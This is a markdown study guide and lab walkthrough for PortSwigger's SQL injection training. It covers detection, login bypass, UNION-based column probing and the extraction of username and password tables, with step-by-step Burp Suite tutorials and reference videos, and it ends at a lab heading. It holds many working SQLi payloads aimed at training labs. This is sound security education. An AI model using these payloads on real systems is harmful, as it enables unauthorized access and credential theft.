# SQL Injection — PortSwigger Web Security Academy

[🇮🇩 Read in Bahasa Indonesia](sql-injection-id.md)

﷽

## What is that?

![sql-injection](images/overview/sql-injection.png)

This learning path introduces SQL injection (SQLi), a critical web vulnerability. You'll learn how to detect and exploit SQLi to uncover hidden data and manipulate application behavior, as well as essential techniques to secure applications against SQLi attacks.

## What is SQL injection (SQLi)?

SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situasions, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

## What is the impact of a successful SQL injection attack?

A successfull SQL injection attack can result in unauthorized access to sensitive data, such as:

- Password.
- Credit card details.
- Personal user information.

>Notes: SQL injection attack have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leanding to a long-term compromise that can go unnoticed for an extended period.

## How to detect SQL injection vulnerabilities

You can detect SQL injection manually using a systematic set of tests against every entry point in the application. To do this, you would typically submit:

- The single quote `'` and look for errors or other anomalies
- Some SQL-specific syntax that evaluates to the base (original) value of the entry point, and to a different value, and look for systematic diffrences in the application responses.
- Boolean conditions such as `OR 1=1` and `OR 1=2`, and look for differences in the application's responses.
- Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.
- OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.

>Notes: Alternatively, you can find majority of SQL Injection vulnerabilities quickly and reliably using Burp Scanner (Burpsuite).

### SQL injection in different parts of the query

Most SQL injection vulnerabilities occur within the `WHERE` clause of a `SELECT` query. Most experienced testers are familiar with this type of SQL injection.

However, SQL injection vulnerabilities can occur at any location within the query, and within different query types. Some other common locations where SQL injection arises are:

- In `UPDATE` statments, within the updated values or the `WHERE` clause.
- In `INSERT` statments, within the inserted values.
- In `SELECT` statments, within the table or column name.
- In `SELECT` statments, within the `ORDER BY` clause.

## Retrieving hidden data

Imagine a shopping application that displays products in diffrent categories. When the user clicks on the *Gifts* category, their browser request the URL:

```url
https://insecure-website.com/products?category=Gifts
```

This causes the application to make a SQL query to retrieve details of the relevant products from the database:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

This SQL query asks the database to return:

- all details `(*)`
- from the `products` table
- where the category is `Gifts`
- and `released` is `1`

>Notes: The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.

### Retrieving hidden data - Continued

The application doest' implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:

```url
https://insecure-website.com/products?category=Gifts'--
```
This results in the SQL query:

```SQL
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```
Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is interpreted as a comment, effectively removing it. In this example, this means the query no longer includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.

You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:

```url
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```
This results in the SQL Query:

```SQL
SELECT * FROM products WHERE category = 'Gifts'+OR+1=1--' AND released = 1
```
The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

>Warning: Take care when injecting condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in mutiple different queries. If you condition reaches an `UPDATE` or `DELETE` statment, for example, it can result in an accidental loss of data.


#### Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

This lab contains a SQL injection vulnerability in the product category filter. When the user selects a category, the application carries out a SQL query like the following:

```SQL
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```
<details>
<summary>Lab details, screenshots & walkthrough 0.1</summary>

To solve the lab, perform a SQL injection attack that causes the application to display one or more unreleased products.

![access lab 0.1](images/lab-0.1-retrieving-hidden-data/access-lab-0.1.png)

![Intercept 0.1](images/lab-0.1-retrieving-hidden-data/intercept-01.png)

![error 0.1](images/lab-0.1-retrieving-hidden-data/error-01.png)

![comment 0.1](images/lab-0.1-retrieving-hidden-data/comment-01.png)

![true 0.1](images/lab-0.1-retrieving-hidden-data/true-01.png)

##### Tutorial

1. Use Burp Suite to intercept and send request to repeater
2. Modify the `'` and `'--+` for see behavior from request to respone.
3. Modify the `category` parameter, giving it the value `+OR+1=1--`
4. Submit the request, and verify that the response now contains one or more unreleased products.

##### Reference

<details>
<summary>1. From SQL Injection to Retrieve Hidden Data! — Intigriti</summary>

Platform: YouTube
Topic: SQL Injection — Retrieving Hidden Data
Video: https://www.youtube.com/watch?v=alTceRdSxS0
Purpose: Understand how SQL injection can be used to retrieve data hidden by an application's query conditions.

</details>

<details>
<summary>2. SQL Injection Lab #1 — Rana Khalil</summary>

Topic: SQL Injection Vulnerability in WHERE Clause Allowing Retrieval of Hidden Data
Video: https://www.youtube.com/watch?v=X1X1UdaC_90&t=1s
Purpose: Learn the practical workflow for identifying and understanding SQL injection in a WHERE clause.

</details>

<details>
<summary>3. SQL Injection Vulnerability in WHERE Clause — BlackArch/Burp by z3nsh3ll</summary>

Topic: SQL Injection — Retrieving Hidden Data
Video: https://www.youtube.com/watch?v=jTHz9Rz7oAo
Purpose: Review a practical demonstration involving SQL injection testing with Burp Suite.

</details>

<details>
<summary>4. SQL Injection — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=U1tfxVGLPAs&t=1s
Purpose: Additional reference for learning about SQL injection and its practical application.

</details>

</details>

## Subverting application logic

Imagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:

```SQL
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```
if the query returns the details of a user, then the login is successful. Otherwise, it is rejected.

In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from `WHERE` clause of the query. For example, submiting the username `administrator'--` and a blank password results in the following the query:

```SQL
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```
This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.

#### Lab: SQL injection vulnerability allowing login bypass

To solve the lab, perform a SQL injection attack that logs in to the application as the `administrator` user.

<details>
<summary>Lab details, screenshots & walkthrough 0.2</summary>

This lab contains a SQL Injection vulnerability in the login function. 

![access lab 0.2](images/lab-0.2-login-bypass/access-lab-0.2.png)

![go my account and login 0.2](images/lab-0.2-login-bypass/go-my-account-and-login-0.2.png)

![send repeater 0.2](images/lab-0.2-login-bypass/repeater-0.2.png)

![error 0.2](images/lab-0.2-login-bypass/error-0.2.png)

![forward 0.2](images/lab-0.2-login-bypass/forward-0.2.png)

![my account get login administrator 0.2](images/lab-0.2-login-bypass/my-account-get-login-administrator-0.2.png)

##### Tutorial

1. Use Burp Suite to intercept and send to repeater the login request.
2. See and modify `username` parameter, giving it input `administrator'` for see error respone `500` status code behaviour.
3. Modify in forward from intercept, giving it the value `administrator'--`
4. Success login with `administrator` account.

##### Reference

<details>
<summary>5. SQL Injection: Bypassing Login Authentication | PortSwigger (OLD) — Michael Sommer</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=4FGkpyYYfCs&t=1s
Purpose: In this episode, we take SQL injection beyond data extraction and use it to bypass authentication entirely. By intercepting a login request in Burp Suite and manipulating the username field, we get logged in as the administrator account — without ever knowing, or needing, the correct password.

</details>

<details>
<summary>6. SQL Injection - Lab #2 SQL injection vulnerability allowing login bypass — Rana Khalil</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=ML3aGaloczI&t=1s
Purpose: In this video, we cover lab #2 in the SQL injection track of the Web Security Academy. This lab contains a SQL injection vulnerability in the login function. To solve the lab, we perform a SQL injection attack that bypasses authentication and allows us to log into the application as the administrator user.
</details>

<details>
<summary> 7.SQL Injection Vulnerability Allowing Login Bypass — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=mS0A9e_oy8A&t=1s
Purpose: In this video we solve the Burp suite academy lab entitled 'SQL injection vulnerability allowing login bypass'
</details>

</details>

## SQL injection UNION attacks

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION Attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

```SQL
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```
This SQL query returns a single results set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

### SQL injection UNION attacks - Continued

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

### Determining the number of columns required

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

One method involves injectiong a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection poin is a quoted string within the `WHERE` clause of the original query, you would submit:

```SQL
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
etc.
```
This series of payload modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns in the result set, the database returns an error, such as:

```SQL
The ORDER BY position number 3 is out of range of the number of items in the select list.
```
The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long you can detect some difference in the response, you can infer how many columns are being returned from the query.

#### Determining the number of columns required - Continued

The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:

```SQL
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
etc.
```
If the number of nulls does not match the number of columns, the database returns an error, such as:

```SQL
All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
```
We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.

As with the `ORDER BY` technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

##### Lab: SQL injection UNION attack, determining the number of columns returned by the query

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsesquent labs to construct the full attack.

<details>
<summary>Lab details, screenshots & walkthrough 0.3</summary>

To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

![access labs 0.3](images/lab-0.3-union-column-count/access-lab-0.3.png)

![go to search parameter Pets 0.3](images/lab-0.3-union-column-count/go-to-search-parameter-Pets-0.3.png)

![intercept 0.3](images/lab-0.3-union-column-count/intercept-0.3.png)

![error 0.3](images/lab-0.3-union-column-count/error-0.3.png)

![comment 0.3](images/lab-0.3-union-column-count/comments-0.3.png)

![ORDER BY 1 0.3](images/lab-0.3-union-column-count/ORDER-BY-1-0.3.png)

![ORDER BY 2 0.3](images/lab-0.3-union-column-count/ORDER-BY-2-0.3.png)

![ORDER BY 3 0.3](images/lab-0.3-union-column-count/ORDER-BY-3-0.3.png)

![Error in ORDER BY 4 0.3](images/lab-0.3-union-column-count/Error-in-ORDER-BY-4-0.3.png)

![ORDER BY give a detected select table in 3 0.3](images/lab-0.3-union-column-count/ORDER-BY-give-a-detected-select-table-in-3-0.3.png)

![add + repersentation 0.3](images/lab-0.3-union-column-count/add-+-repersentation-0.3.png)

![change NULL have respone 200 0.3](images/lab-0.3-union-column-count/change-NULL-0.3.png)

![Success to UNION Attack determining the number columns by query 0.3](images/lab-0.3-union-column-count/success-0.3.png)


##### Tutorial

1. **Intercept the Request**  
   Use Burp Suite to intercept the request containing `category=Pets`, then send it to Repeater.
2. **Test for SQL Injection**  
   Modify the `category` parameter to check for SQL errors and compare the responses.

   ```sql
   category='
   category='--
   ```
3. **Determine the Number of Columns**  
   Use `ORDER BY` with increasing column numbers until an error occurs.

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ' ORDER BY 4--
   ```
4. **Test UNION SELECT with NULL Values**  
   Test different numbers of `NULL` values to determine the correct column count.

   ```sql
   ' UNION SELECT NULL--
   ' UNION SELECT NULL,NULL--
   ' UNION SELECT NULL,NULL,NULL--
   ```
5. **Test the Alternative NULL Representation**  
   Test the alternative representation shown in the screenshots.

   ```sql
   ' UNION SELECT NULL,+NULL,+NULL--
   ```
6. **Verify the Response**  
   Check for an HTTP `200 OK` response and compare the response body with the normal response to determine whether the UNION query is accepted.


##### Reference

<details>
<summary>8. SQL Injection - Lab #3 SQLI UNION attack determining the number of columns returned by query — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=umXGHbEyW5I
Purpose: This lab contains a SQL injection vulnerability in the product filter category field. This vulnerability can be exploited using a UNION attack to retrieve data from other tables. To solve the lab, we perform a SQL injection attack that determines the number of columns that are being returned by the query.This is the first step of a SQL injection UNION attack. We'll use this technique in subsequent labs to construct the full attack.

</details>

<details>
<summary> 9. SQL UNION Attack - Determining the Number of Columns Returned by Query — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=mS0A9e_oy8A&t=1s
Purpose: This lab was provided by the burp suite web security academy for learning SQL injection union injection attacks. The task is 'determining the number of columns returned by the query'. 
</details>

</details>


#### Database-specific syntax

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

```SQL
' UNION SELECT NULL FROM DUAL--
```
The payloads described the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used identify a comment

>Notes: For more details of database-specific syntax, see the [SQL Injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Finding columns with a useful data type

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:

```SQL
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
```
If the column data type is not compatible with string data, the injected query will cause a database error, such as:

```SQL
Conversion failed when converting the varchar value 'a' to data type int.
```
If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.

##### Lab: SQL injection UNION attack, finding a column containing text

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

<details>
<summary>Lab details, screenshots & walkthrough 0.4</summary>

The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform a SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data.

![access labs 0.4](images/lab-0.4-union-text-column/access-lab-0.4.png)

![Open Gifts parameter 0.4](images/lab-0.4-union-text-column/Open-Gifts-parameter-0.4.png)

![intercept and repeater 0.4](images/lab-0.4-union-text-column/intercept-and-repeater-0.4.png)

![error 0.4](images/lab-0.4-union-text-column/error-0.4.png)

![comment 0.4](images/lab-0.4-union-text-column/comments-0.4.png)

![ORDER BY 1 0.4](images/lab-0.4-union-text-column/ORDER-BY-1-0.4.png)

![ORDER BY 2 0.4](images/lab-0.4-union-text-column/ORDER-BY-2-0.4.png)

![ORDER BY 3 0.4](images/lab-0.4-union-text-column/ORDER-BY-3-0.4.png)

![Error in ORDER BY 4 0.4](images/lab-0.4-union-text-column/Error-in-ORDER-BY-4-0.4.png)

![Give UNION SELECT 1,2,3 and changes values NULL NULL NULL 0.4](images/lab-0.4-union-text-column/change-NULL-0.4.png)

![in respone success get information the database retrieve the string: 'AAAA' 0.4](images/lab-0.4-union-text-column/response-success-0.4.png)

##### Tutorial

1. **Intercept the Request**  
   Use Burp Suite to intercept the request containing `category=Gifts`, then send it to Repeater.
2. **Test for SQL Injection**  
   Modify the `category` parameter to check for SQL errors and compare the responses.

   ```sql
   category='
   category='--
   ```
3. **Determine the Number of Columns**  
   Use `ORDER BY` with increasing column numbers until an error occurs.

   ```sql
   ' ORDER BY 1--
   ' ORDER BY 2--
   ' ORDER BY 3--
   ' ORDER BY 4--
   ```
4. **Test UNION SELECT**  
   Since `ORDER BY 4` produces an error while `ORDER BY 3` succeeds, test a UNION query with three columns.

   ```sql
   ' UNION SELECT NULL,NULL,NULL--
   ```
5. **Identify the Displayed Column**  
   Replace the `NULL` values with identifiable strings or numbers to determine which column is reflected in the response.

   ```sql
   '+UNION+SELECT+NULL,"AAAA",NULL--
   ```
6. **Verify the Result**  
   Check the response for HTTP `200 OK` and look for the reflected value, such as `"AAAA"`, in the response body. This confirms that the UNION query is being processed and identifies the displayed column.

##### Reference

<details>
<summary>10. SQL Injection - Lab #4 SQL injection UNION attack, finding a column containing text — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=SGBTC5D7DTs
Purpose: This lab contains an SQL injection vulnerability in the product category filter. To solve the lab, we perform a SQL injection attack that returns an additional row containing the value provided. This technique helps us determine which columns are compatible with string data.

</details>

<details>
<summary> 11. 
SQL Union Attack - Finding a Column Containing Text — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=itECw0Yn8tQ
Purpose: This lab was provided by the Burp Web Security Academy. We solve the challenge 'finding a column containing text'
</details>

</details>

### Using a SQL injection UNION attack to retrieve interesting data

When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.

Suppose that:

- The original query returns two columns, both of which can hold string data.
- The injection point is a quoted string within the `WHERE` clause.
- The database contains a table called `users` with the columns `username` and `password`

In this example, you can retrieve the contents of the `users` table by submitting the input:

```sql
' UNION SELECT username, password FROM users--
```
In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

##### Lab: SQL injection UNION attack, retrieving data from other tables

This lab contains a SQL Injection vulnerabillity in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack t retrieve data from other tables. To construct such an attack, you need to combine some of techniques you learned in previous labs.

<details>
<summary>Lab details, screenshots & walkthrough 0.5</summary>

The database contains a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

![access labs 0.5](images/lab-0.5-union-retrieve-data/access-lab-0.5.png)

![Open Gifts parameter 0.5](images/lab-0.5-union-retrieve-data/Open-Gifts-parameter-0.5.png)

![intercept and repeater 0.5](images/lab-0.5-union-retrieve-data/intercept-and-repeater-0.5.png)

![error 0.5](images/lab-0.5-union-retrieve-data/error-0.5.png)

![comment 0.5](images/lab-0.5-union-retrieve-data/comments-0.5.png)

![ORDER BY 1 0.5](images/lab-0.5-union-retrieve-data/ORDER-BY-1-0.5.png)

![ORDER BY 2 0.5](images/lab-0.5-union-retrieve-data/ORDER-BY-2-0.5.png)

![Error in ORDER BY 3 0.5](images/lab-0.5-union-retrieve-data/error-in-ORDER-BY-3-0.5.png)

![Give UNION SELECT 1,2 and changes values NULL NULL0.5](images/lab-0.5-union-retrieve-data/change-NULL-0.5.png)

![change tables input string 'a','b' 0.5](images/lab-0.5-union-retrieve-data/change-tables-input-string-0.5.png)

![input statment to reteriving username and password 0.5](images/lab-0.5-union-retrieve-data/statments-username-password-0.5.png)

![open respone 0.5](images/lab-0.5-union-retrieve-data/open-respone-0.5.png)

![copy respone paste url to browser 0.5](images/lab-0.5-union-retrieve-data/copy-paste-url-0.5.png)

![username in respone frontend or respone get 200 and leak](images/lab-0.5-union-retrieve-data/leak-0.5.png)

![login username administrator 0.5](images/lab-0.5-union-retrieve-data/login-0.5.png)

![success access administrator 0.5](images/lab-0.5-union-retrieve-data/success-login-0.5.png)

##### Tutorial

1. Open Burpsuite  and intercept parameters `Gifts`
2. Intercept request and send to repeater
3. Modify to see behaviour request send input `'` have a respone 500 code error.
4. Modify request send input `'--` for comments have a respone 200 success.
5. Determine columns that vulnerable query is using `ORDER BY`

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
6. Success detect error columns in `ORDER BY 3`
7. Determine the data type of the columns used `UNION SELECT`
8. Because statment columns find in `3` Try this `UNION SELECT`:

```SQL
' UNION SELECT 1,2--
' UNION SELECT NULL,NULL--
' UNION SELECT 'A','B'--
```
9. send UNION SELECT for both are data type string `'A' and 'b'` for validation tables.
10. Giving a value Statment to retreving data `username` and `password` from other tables:

```sql
' UNION SELECT username, password from users--
```
11. In response HTTP and frontend success get leakked `username` and `password` from tables.

12. Try login users `administrator`

##### Reference

<details>
<summary> 12. UNION SQL Injection to Extract Data From Other Tables! — Intigriti</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=PLa_oQtMl1U
Purpose: In this video, we are going to have a look at a UNION SELECT query to extract data from another database table. 
</details>

<details>
<summary>13. SQL Injection - Lab #5 SQL injection UNION attack, retrieving data from other tables — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=6Dsj5SqR944
Purpose: This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack that retrieves the usernames and passwords of the users of the application.

</details>

<details>
<summary> 14. SQL Union Attack Retrieving Data From Other Tables — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=ushDHoJbwEc
Purpose: In this video we solve the Burp Suite Web Academy lab - "SQL Union Attack Retrieving Data From Other Tables"
</details>

</details>

### Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:

```sql
` UNION SELECT username || '~' || password FROM users--
```
This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:

```
administrator~s3cure
wiener~peter
carlos~montoya
```
>Notes: Different databases use different syntax to perform string concatenation. For more details, see the [SQL injection cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)


##### Lab: SQL injection UNION attack, retrieving multiple values in a single column

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.

<details>
<summary>Lab details, screenshots & walkthrough 0.6</summary>

The database cibtaubs a different table called `users`, with columns called `username` and `password`.

To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

>Note: You can find some useful payloads on our [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet).

![access labs 0.6](images/lab-0.6-union-multiple-values/access-lab-0.6.png)

![Open Pets parameter 0.6](images/lab-0.6-union-multiple-values/Open-Pets-parameter-0.6.png)

![intercept and repeater 0.6](images/lab-0.6-union-multiple-values/intercept-and-repeater-0.6.png)

![error 0.6](images/lab-0.6-union-multiple-values/error-0.6.png)

![comment 0.6](images/lab-0.6-union-multiple-values/comments-0.6.png)

![ORDER BY 1 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-1-0.6.png)

![ORDER BY 2 0.6](images/lab-0.6-union-multiple-values/ORDER-BY-2-0.6.png)

![Error in ORDER BY 3 0.6](images/lab-0.6-union-multiple-values/error-in-ORDER-BY-3-0.6.png)

![change tables input string 'a','b' response error 0.6](images/lab-0.6-union-multiple-values/error-change-tables-input-string-0.6.png)

![change tables input string 'null','null' response success 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-null-0.6.png)

![change tables input string null,'b' response success 0.6](images/lab-0.6-union-multiple-values/success-change-tables-input-string-b-0.6.png)

![check reference sql injection cheatsheet from portswigger](images/lab-0.6-union-multiple-values/portswigger-string-concatenation-reference-0.6.png)

![check reference string concatenation syntax](images/lab-0.6-union-multiple-values/opsgrep-string-concatenation-references-0.6.png)

![retreive union select statment users and password respone error 0.6](images/lab-0.6-union-multiple-values/union-select-statments-error-0.6.png)

![error input string concatenation |](images/lab-0.6-union-multiple-values/error-input-|-string-concatenation-0.6.png)

![success input string concatenation ||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||-string-concatenation-0.6.png)

![error input string concatenation |||](images/lab-0.6-union-multiple-values/error-input-|||-string-concatenation-0.6.png)

![error input string concatenation ||||](images/lab-0.6-union-multiple-values/error-input-||||-string-concatenation-0.6.png)

![success input string concatenation ||''||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||''||-string-concatenation-0.6.png)

![success input string concatenation ||'_'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'_'||-string-concatenation-0.6.png)

![success input string concatenation ||'+'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'+'||-string-concatenation-0.6.png)

![success input string concatenation ||'~'||](images/lab-0.6-union-multiple-values/success-spawn-users-password-input-||'~'||-string-concatenation-0.6.png)

![testing login administrator users and password leak](images/lab-0.6-union-multiple-values/login-0.6.png)

![success login administrator users and password](images/lab-0.6-union-multiple-values/success-login-0.6.png)

##### Tutorial

1. Open Burpsuite  and intercept parameters `Pets`
2. Intercept request and send to repeater.
3. Modify to see behaviour request send input `'` have a respone 500 code error.
4. Modify request send input `'--` for comments have a respone 200 success.
5. Determine columns that vulnerable query is using `ORDER BY`

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```
6. Success detect error columns in `ORDER BY 3`
7. Determine the data type of the columns used `UNION SELECT`
8. send UNION SELECT for both are data type string `'A' and 'b'` for check validation tables.
9. Because statment columns find in `3` Try this `UNION SELECT`

```SQL
' UNION SELECT 'A','B'-- Have error columns a respone give 500
' UNION SELECT NULL,NULL-- Success determine new columns a respone give 200
' UNION SELECT 'A',NULL-- Have error columns a respone give 500
' UNION SELECT  NULL,'B'-- Success to spawn columns 'B'
```
9. Check cheatsheet search about String Concatenation
>Reference:
>- [SQL Injection Cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
>- [SQL concatenation Syntax Reference](https://opsgrep.com/concatenation-in-sql-query/#toc-1-sql-concatenation-syntax-reference)
10. Input and give a values `UNION SELECT` to retrieve content of `users` table: 

```sql
' UNION SELECT username, password from users-- Error
' UNION SELECT username,|password from users-- error
' UNION SELECT username,||password from users-- success retrieve use operator ||
' UNION SELECT username,|||password from users-- error
' UNION SELECT username,|||password from users-- error
' UNION SELECT username,||||password from users-- error
' UNION SELECT username,||''||password from users-- success retrieve for open ''
' UNION SELECT username,||'_'||password from users-- use operator `_`
' UNION SELECT username,||'+'||password from users-- use operator `+`
' UNION SELECT username,||'~'||password from users-- use operator `~`
```
11. In response HTTP and frontend success get leakked `username` and `password` from tables.

12. Try login users `administrator`

##### Reference

<details>
<summary> 15. SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column | PortSwigger Lab — Michael Sommer</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=b5spqjjsxnw
Purpose: In this video we solve the PortSwigger Web Security Academy lab "SQL injection UNION attack, retrieving multiple values in a single column" – a UNION attack where the query only gives us one usable text column, but we want two pieces of data out of it.
</details>

<details>
<summary>16. SQL Injection - Lab #6 SQL injection UNION attack, retrieving multiple values in a single column — Rana Khalil</summary>

Platform: YouTube
Video: https://www.youtube.com/watch?v=yRVYoqR9vrI
Purpose: In this video, we cover Lab #6 in the SQL injection track of the Web Security Academy. This lab contains a SQL injection vulnerability in the product category field. To solve the lab, we perform a UNION based SQL injection attack that retrieves the usernames and passwords of the users of the application in a single column.

</details>

<details>
<summary> 17. SQL Retrieving Multiple Values in Single Column - String Concatenation in SQL — z3nsh3ll</summary>

Platform: Youtube
Video: https://www.youtube.com/watch?v=lu_8CT0JwZs
Purpose: In this video we solve the Burp Suite Web Academy Lab 'SQL Injection Union Attack - Retrieving Multiple Values in a Single Column'.
</details>

</details>

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

### Examining the database in SQL injection attacks

To exploit SQL injection vulnerabilities, it's often necessary to find information about the database. This includes:

- The type and version of the database software.
- The tables and columns that the database contains.

#### Querying the database type and version

You can potentially identify both the database type and version by injecting provider-specific queries to see if one works

The following are some queries determine the database version for some popular database types:

| Database Type | Query |
| --- | --- |
| Microsoft SQL Server | `SELECT @@version` |
| MySQL | `SELECT @@version` |
| Oracle | `SELECT * FROM v$version` |
| PostgreSQL | `SELECT version()` |

For example, you could use a `UNION` attack with the following input:
```sql
' UNION SELECT @@version--
```
This might return the following output. In this case, you can confirm that the database is Microsoft SQL Server and see the version used:
```txt
Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
Mar 18 2018 09:11:49
Copyright (c) Microsoft Corporation
Standard Edition (64-bit) on Windows Server 2016 Standard 10.0 <X64> (Build 14393: ) (Hypervisor)
```

##### Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

